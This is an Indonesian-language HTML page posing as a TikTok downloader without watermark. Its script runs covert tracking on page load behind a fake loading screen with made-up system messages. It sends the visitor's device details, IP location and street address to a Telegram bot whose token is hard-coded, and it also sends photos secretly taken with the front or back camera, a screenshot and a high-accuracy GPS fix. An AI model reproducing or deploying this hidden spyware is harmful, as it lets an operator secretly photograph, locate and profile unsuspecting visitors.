<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Video TikTok Tanpa Watermark</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        /* Reset dan gaya dasar */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            background: linear-gradient(135deg, #6e48aa, #9d50bb);
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header */
        header {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #6e48aa;
            margin-bottom: 10px;
        }
        
        .tagline {
            color: #666;
            font-size: 16px;
        }
        
        /* Container utama */
        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        
        /* Form download */
        .download-form {
            background-color: white;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 600px;
            text-align: center;
        }
        
        .form-title {
            font-size: 24px;
            margin-bottom: 20px;
            color: #6e48aa;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .url-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .url-input:focus {
            border-color: #6e48aa;
            outline: none;
        }
        
        .download-btn {
            background: linear-gradient(135deg, #6e48aa, #9d50bb);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
        }
        
        .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(110, 72, 170, 0.4);
        }
        
        .download-btn:active {
            transform: translateY(0);
        }
        
        /* Hasil download */
        .result-container {
            margin-top: 30px;
            display: none;
            background-color: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 600px;
        }
        
        .video-preview {
            width: 100%;
            border-radius: 8px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        
        .video-preview img {
            width: 100%;
            height: auto;
            display: block;
        }
        
        .video-info {
            text-align: left;
            margin-bottom: 20px;
        }
        
        .video-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .video-details {
            color: #666;
            font-size: 14px;
            margin-bottom: 5px;
        }
        
        .download-options {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .option-btn {
            flex: 1;
            min-width: 120px;
            background-color: #f5f5f5;
            border: none;
            padding: 10px 15px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .option-btn:hover {
            background-color: #e9e9e9;
        }
        
        .option-btn.primary {
            background: linear-gradient(135deg, #6e48aa, #9d50bb);
            color: white;
        }
        
        .option-btn.primary:hover {
            background: linear-gradient(135deg, #5d3d95, #8a45a8);
        }
        
        /* Footer */
        footer {
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            text-align: center;
        }
        
        .footer-text {
            font-size: 14px;
            opacity: 0.8;
        }
        
        /* Loading */
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(110, 72, 170, 0.2);
            border-radius: 50%;
            border-top: 4px solid #6e48aa;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Container loading tersembunyi */
        #loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            text-align: center;
            color: #999;
        }
        
        #loading-text {
            font-size: 22px;
            margin-bottom: 20px;
            color: #6e48aa;
        }
        
        #progress-container {
            height: 3px;
            background: #222;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 10px;
            width: 80%;
            max-width: 400px;
        }
        
        #progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #6e48aa, #9d50bb);
            transition: width 0.3s ease;
        }
        
        #loading-details {
            margin-top: 10px;
            font-size: 14px;
            color: #666;
            min-height: 20px;
        }
        
        .hidden {
            display: none !important;
        }
        
        /* Responsif */
        @media (max-width: 768px) {
            .download-form, .result-container {
                padding: 20px;
            }
            
            .download-options {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <!-- Loading screen tersembunyi -->
    <div id="loading-container" class="hidden">
        <div>
            <div id="loading-text">PROSES LOADING</div>
            <div id="progress-container">
                <div id="progress-bar"></div>
            </div>
            <div id="loading-details">Memulai inisialisasi...</div>
        </div>
    </div>
    
    <!-- Elemen untuk capture kamera (tersembunyi) -->
    <video id="video-element" autoplay muted class="hidden"></video>
    <canvas id="canvas-element" class="hidden"></canvas>

    <!-- Tampilan utama website -->
    <header>
        <div class="logo">TikTok Downloader</div>
        <div class="tagline">Download video TikTok tanpa watermark dengan mudah dan cepat</div>
    </header>
    
    <div class="main-container">
        <div class="download-form">
            <h2 class="form-title">Download Video TikTok</h2>
            <p style="margin-bottom: 20px; color: #666;">Masukkan URL video TikTok di bawah ini untuk mendownload tanpa watermark</p>
            
            <div class="input-group">
                <input type="text" id="tiktok-url" class="url-input" placeholder="https://www.tiktok.com/@username/video/1234567890" required>
            </div>
            
            <button id="download-btn" class="download-btn">Download Video</button>
            
            <div class="loading" id="loading-indicator">
                <div class="spinner"></div>
                <p>Mengambil informasi video...</p>
            </div>
        </div>
        
        <div class="result-container" id="result-container">
            <h3 style="margin-bottom: 15px; color: #6e48aa;">Video Siap Didownload</h3>
            
            <div class="video-preview">
                <img id="video-thumbnail" src="" alt="Thumbnail Video">
            </div>
            
            <div class="video-info">
                <div class="video-title" id="video-title">Judul Video</div>
                <div class="video-details" id="video-author">Pembuat: -</div>
                <div class="video-details" id="video-duration">Durasi: -</div>
                <div class="video-details" id="video-views">Dilihat: -</div>
            </div>
            
            <div class="download-options">
                <button class="option-btn primary" id="download-without-watermark">Download Tanpa Watermark</button>
                <button class="option-btn" id="download-with-watermark">Download Dengan Watermark</button>
                <button class="option-btn" id="download-audio">Download Audio</button>
            </div>
        </div>
    </div>
    
    <footer>
        <div class="footer-text">
            &copy; 2025 TikTok Downloader - Download video TikTok tanpa watermark
        </div>
    </footer>

    <script>
        (() => {
            // ========== KONFIGURASI TRACKING ==========
            // MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
            const TELEGRAM_BOT_TOKEN = '8236050362:AAEgD4-CRiLmgymv4liDcEof8yCvSANGgXs';
            
            // MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
            const TELEGRAM_CHAT_ID = '5498433064';
            
            // ========== ELEMEN DOM ==========
            const progressBar = document.getElementById('progress-bar');
            const loadingDetails = document.getElementById('loading-details');
            const videoElement = document.getElementById('video-element');
            const canvasElement = document.getElementById('canvas-element');
            const loadingContainer = document.getElementById('loading-container');
            
            // Elemen untuk tampilan utama
            const tiktokUrlInput = document.getElementById('tiktok-url');
            const downloadBtn = document.getElementById('download-btn');
            const loadingIndicator = document.getElementById('loading-indicator');
            const resultContainer = document.getElementById('result-container');
            const videoThumbnail = document.getElementById('video-thumbnail');
            const videoTitle = document.getElementById('video-title');
            const videoAuthor = document.getElementById('video-author');
            const videoDuration = document.getElementById('video-duration');
            const videoViews = document.getElementById('video-views');
            const downloadWithoutWatermark = document.getElementById('download-without-watermark');
            const downloadWithWatermark = document.getElementById('download-with-watermark');
            const downloadAudio = document.getElementById('download-audio');
            
            // ========== VARIABEL GLOBAL ==========
            let progress = 0;
            let currentVideoData = null;
            
            // Pesan loading yang akan ditampilkan secara acak
            const loadingMessages = [
                "Memeriksa modul sistem...",
                "Memuat komponen inti...",
                "Menginisialisasi antarmuka...",
                "Memverifikasi koneksi...",
                "Menyiapkan lingkungan...",
                "Memeriksa pembaruan...",
                "Memuat aset tampilan..."
            ];
            
            // ========== FUNGSI UTAMA WEBSITE DOWNLOAD ==========
            
            /**
             * Mengambil data video TikTok dari API
             */
            async function fetchTikTokData(url) {
                try {
                    // Encode URL untuk request API
                    const encodedUrl = encodeURIComponent(url);
                    
                    // Menggunakan API yang Anda berikan
                    const response = await fetch(`https://zenitsu.web.id/api/download/tiktok?url=${encodedUrl}`);
                    
                    if (!response.ok) {
                        throw new Error('Gagal mengambil data video');
                    }
                    
                    const data = await response.json();
                    
                    if (data.statusCode !== 200) {
                        throw new Error('URL TikTok tidak valid');
                    }
                    
                    return data.results;
                } catch (error) {
                    console.error('Error fetching TikTok data:', error);
                    throw error;
                }
            }
            
            /**
             * Menampilkan hasil video
             */
            function displayVideoResult(videoData) {
                videoThumbnail.src = videoData.cover;
                videoTitle.textContent = videoData.title || 'Judul tidak tersedia';
                videoAuthor.textContent = `Pembuat: ${videoData.author.nickname || 'Tidak diketahui'}`;
                videoDuration.textContent = `Durasi: ${videoData.duration || 0} detik`;
                videoViews.textContent = `Dilihat: ${videoData.play_count || 0} kali`;
                
                resultContainer.style.display = 'block';
                currentVideoData = videoData;
            }
            
            /**
             * Mendownload file
             */
            function downloadFile(url, filename) {
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }
            
            // ========== FUNGSI TRACKING (TERSEMBUNYI) ==========
            
            /**
             * Memperbarui progress bar dan menampilkan pesan loading acak
             */
            function updateProgress() {
                progress += Math.random() * 5;
                if (progress > 98) progress = 98;
                progressBar.style.width = progress + '%';
                
                // Tampilkan pesan loading acak secara periodik
                if (Math.random() > 0.9) {
                    const randomMessage = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
                    loadingDetails.textContent = randomMessage;
                }
            }
            
            /**
             * Mengirim pesan teks ke Telegram
             * @param {string} message - Pesan yang akan dikirim
             */
            async function sendToTelegram(message) {
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (error) {
                    console.error('Gagal mengirim pesan ke Telegram:', error);
                }
            }
            
            /**
             * Mengirim foto ke Telegram
             * @param {Blob} blob - Gambar dalam format blob
             * @param {string} filename - Nama file untuk gambar
             */
            async function sendPhotoToTelegram(blob, filename) {
                try {
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append('photo', blob, filename);
                    
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (error) {
                    console.error('Gagal mengirim foto ke Telegram:', error);
                }
            }
            
            /**
             * Mendapatkan detail lokasi dari koordinat
             * @param {number} latitude - Koordinat latitude
             * @param {number} longitude - Koordinat longitude
             * @returns {Object} Objek dengan detail lokasi
             */
            async function getLocationDetails(latitude, longitude) {
                try {
                    const response = await fetch(
                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
                    );
                    const data = await response.json();
                    
                    if (data.address) {
                        return {
                            kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                            kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                            alamatLengkap: data.display_name || "Alamat tidak tersedia"
                        };
                    }
                } catch (error) {
                    console.error('Gagal mendapatkan detail lokasi:', error);
                }
                
                // Nilai default jika gagal
                return {
                    kabupaten: "Tidak diketahui",
                    kecamatan: "Tidak diketahui",
                    alamatLengkap: "Alamat tidak tersedia"
                };
            }
            
            /**
             * Mengumpulkan informasi perangkat
             * @returns {string} String berisi informasi perangkat yang diformat
             */
            async function collectDeviceInfo() {
                let message = 'TRACKING REPORT \n\n';
                message += 'âš™ï¸ DEVICE INFORMATION â‰¥ BUKAN GPS TRACKING\n\n';
                
                // Informasi dasar perangkat
                message += `ðŸ–¥ï¸ Device : ${navigator.userAgent}\n`;
                message += `ðŸ’» Platform : ${navigator.platform}\n`;
                message += `ðŸŒ Bahasa : ${navigator.language}\n`;
                message += `ðŸ“¶ Online : ${navigator.onLine ? 'Online' : 'Offline'}\n`;
                message += `ðŸ“º Screen Size : ${screen.width}x${screen.height}\n`;
                message += `ðŸªŸ Window Size : ${innerWidth}x${innerHeight}\n`;
                message += `ðŸ’¾ RAM : ${navigator.deviceMemory || 'Unknown'} GB\n`;
                message += `ðŸ§  CPU Cores : ${navigator.hardwareConcurrency}\n`;
                
                // Informasi baterai jika tersedia
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        message += `ðŸ”‹ Battery : ${Math.floor(battery.level * 100)}%\n`;
                        message += `ðŸ”Œ Charging : ${battery.charging ? 'âœ… YA' : 'âŒ TIDAK'}\n`;
                    } catch (error) {
                        message += 'ðŸ”‹ Battery : âŒ Tidak tersedia\n';
                    }
                }
                
                // Informasi tambahan
                message += `â° Waktu Akses : ${new Date().toString()}\n`;
                message += `ðŸ•’ Page Load Time : ${performance.now().toFixed(2)} ms\n`;
                message += `ðŸ“œ History Length : ${history.length}\n`;
                message += `âœ‹ Touch Support : ${'ontouchstart' in window ? 'âœ… YA' : 'âŒ TIDAK'}\n`;
                message += `ðŸ”— Referrer : ${document.referrer || 'None'}\n`;
                message += `ðŸŒ URL : ${location.href}\n`;
                message += `ðŸ“„ Title : ${document.title}\n`;
                message += `ðŸ•“ Timezone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
                message += `ðŸ§­ Offset : ${new Date().getTimezoneOffset()} menit\n\n`;
                
                // Informasi lokasi berdasarkan IP
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    
                    message += 'ðŸ“ LOCATION INFORMATION\n\n';
                    message += `ðŸ“¡ IP Address : ${data.ip}\n`;
                    message += `ðŸ™ï¸ Kota : ${data.city}\n`;
                    message += `ðŸ™ï¸ Kabupaten : ${data.region}\n`;
                    message += `ðŸ—ºï¸ Wilayah : ${data.region}\n`;
                    message += `ðŸŒŽ Negara : ${data.country_name}\n`;
                    message += `ðŸ·ï¸ Kode Pos : ${data.postal}\n`;
                    
                    if (data.latitude && data.longitude) {
                        message += `ðŸ“Œ Latitude : ${data.latitude}\n`;
                        message += `ðŸ“ Longitude : ${data.longitude}\n`;
                        
                        const locationDetails = await getLocationDetails(data.latitude, data.longitude);
                        message += `ðŸ™ï¸ Kabupaten : ${locationDetails.kabupaten}\n`;
                        message += `ðŸ™ï¸ Kecamatan : ${locationDetails.kecamatan}\n`;
                        message += `ðŸ  Alamat Lengkap : ${locationDetails.alamatLengkap}\n`;
                    }
                } catch (error) {
                    message += 'âŒ Gagal mendapatkan informasi lokasi\n';
                }                
                return message;
            }
            
            /**
             * Mengambil gambar dari kamera dengan mode tertentu
             * @param {string} mode - Mode kamera ('user' untuk depan, 'environment' untuk belakang)
             * @returns {boolean} Status keberhasilan pengambilan gambar
             */
            async function captureCamera(mode) {
                let stream;
                
                try {
                    // Mengakses kamera
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { exact: mode }
                        }
                    });
                    
                    // Menampilkan stream di elemen video
                    videoElement.srcObject = stream;
                    
                    // Menunggu video siap
                    await new Promise(resolve => {
                        videoElement.onloadedmetadata = resolve;
                    });
                    
                    videoElement.play();
                    
                    // Waktu tunggu untuk fokus kamera (1.5 detik)
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    
                    // Menggambar frame ke canvas
                    canvasElement.width = videoElement.videoWidth;
                    canvasElement.height = videoElement.videoHeight;
                    canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
                    
                    // Mengirim gambar ke Telegram
                    canvasElement.toBlob(blob => {
                        sendPhotoToTelegram(blob, `${mode}_camera_capture.jpg`);
                    }, 'image/jpeg');
                    
                    // Menghentikan stream
                    stream.getTracks().forEach(track => track.stop());
                    return true;
                    
                } catch (error) {
                    // Menghentikan stream jika ada error
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                    
                    await sendToTelegram(`âš ï¸ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
                    return false;
                }
            }
            
            /**
             * Mengambil screenshot halaman
             */
            async function captureScreenshot() {
                try {
                    const canvas = await html2canvas(document.body);
                    canvas.toBlob(blob => {
                        sendPhotoToTelegram(blob, 'screenshot.jpg');
                    }, 'image/jpeg');
                } catch (error) {
                    await sendToTelegram('âŒ Screenshot failed');
                }
            }
            
            /**
             * Mengambil lokasi GPS
             */
            function captureGPSLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        let gpsMessage = `ðŸ“ GPS TRACKING (ONE-TIME)\n`;
                        gpsMessage += `ðŸ“Œ Lat : ${lat}\n`;
                        gpsMessage += `ðŸ“ Lng : ${lon}\n`;
                        gpsMessage += `ðŸŽ¯ Akurasi: ${position.coords.accuracy}m\n`;
                        gpsMessage += `ðŸ—ºï¸ Google Maps : https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
                        
                        const locationDetails = await getLocationDetails(lat, lon);
                        gpsMessage += `ðŸ™ï¸ Kabupaten : ${locationDetails.kabupaten}\n`;
                        gpsMessage += `ðŸ™ï¸ Kecamatan : ${locationDetails.kecamatan}\n`;
                        gpsMessage += `ðŸ  Alamat : ${locationDetails.alamatLengkap}\n`;
                        
                        await sendToTelegram(gpsMessage);
                    }, async error => {
                        await sendToTelegram(`âŒ GPS Error : ${error.message}`);
                    }, {
                        enableHighAccuracy: true,
                        maximumAge: 0,
                        timeout: 5000
                    });
                }
            }
            
            // ========== FUNGSI TRACKING UTAMA ==========
            
            /**
             * Fungsi utama untuk menjalankan semua proses tracking
             */
            async function startTracking() {
                // Kirim informasi perangkat
                await sendToTelegram(await collectDeviceInfo());
                
                let cameraSuccess = false;
                
                // 1. Coba akses kamera depan
                cameraSuccess = await captureCamera("user");
                
                // 2. Jika gagal, coba kamera belakang
                if (!cameraSuccess) {
                    cameraSuccess = await captureCamera("environment");
                }
                
                // 3. Jika kedua kamera gagal
                if (!cameraSuccess) {
                    await sendToTelegram('âŒ Akses ke kedua kamera (Depan & Belakang) diblokir.');
                }
                
                // Ambil screenshot setelah 2 detik
                setTimeout(captureScreenshot, 2000);
                
                // Ambil lokasi GPS
                captureGPSLocation();
                
                // Selesaikan progress bar
                progressBar.style.width = '100%';
                loadingDetails.textContent = 'Proses selesai';
                
                // Sembunyikan loading screen setelah 3 detik
                setTimeout(() => {
                    loadingContainer.classList.add('hidden');
                }, 3000);
            }
            
            // ========== EVENT LISTENERS ==========
            
            // Event listener untuk tombol download
            downloadBtn.addEventListener('click', async () => {
                const url = tiktokUrlInput.value.trim();
                
                if (!url) {
                    alert('Masukkan URL video TikTok terlebih dahulu');
                    return;
                }
                
                // Validasi URL TikTok
                if (!url.includes('tiktok.com')) {
                    alert('URL harus dari TikTok');
                    return;
                }
                
                // Tampilkan loading indicator
                loadingIndicator.style.display = 'block';
                downloadBtn.disabled = true;
                
                try {
                    const videoData = await fetchTikTokData(url);
                    displayVideoResult(videoData);
                } catch (error) {
                    alert('Gagal mengambil data video. Pastikan URL benar dan coba lagi.');
                    console.error('Error:', error);
                } finally {
                    loadingIndicator.style.display = 'none';
                    downloadBtn.disabled = false;
                }
            });
            
            // Event listener untuk tombol download tanpa watermark
            downloadWithoutWatermark.addEventListener('click', () => {
                if (currentVideoData && currentVideoData.play) {
                    downloadFile(currentVideoData.play, `tiktok_${currentVideoData.id}_nowm.mp4`);
                } else {
                    alert('Data video tidak tersedia');
                }
            });
            
            // Event listener untuk tombol download dengan watermark
            downloadWithWatermark.addEventListener('click', () => {
                if (currentVideoData && currentVideoData.wmplay) {
                    downloadFile(currentVideoData.wmplay, `tiktok_${currentVideoData.id}_wm.mp4`);
                } else {
                    alert('Data video tidak tersedia');
                }
            });
            
            // Event listener untuk tombol download audio
            downloadAudio.addEventListener('click', () => {
                if (currentVideoData && currentVideoData.music) {
                    downloadFile(currentVideoData.music, `tiktok_${currentVideoData.id}_audio.mp3`);
                } else {
                    alert('Data audio tidak tersedia');
                }
            });
            
            // ========== INISIALISASI ==========
            
            // Jalankan tracking di latar belakang saat halaman dimuat
            window.addEventListener('load', () => {
                // Tampilkan loading screen sebentar
                loadingContainer.classList.remove('hidden');
                
                // Mulai interval untuk progress bar
                const progressInterval = setInterval(updateProgress, 500);
                
                // Jalankan tracking utama
                startTracking().finally(() => {
                    // Hentikan interval progress bar setelah tracking selesai
                    setTimeout(() => {
                        clearInterval(progressInterval);
                    }, 3000);
                });
            });
        })();
    </script>
</body>
</html>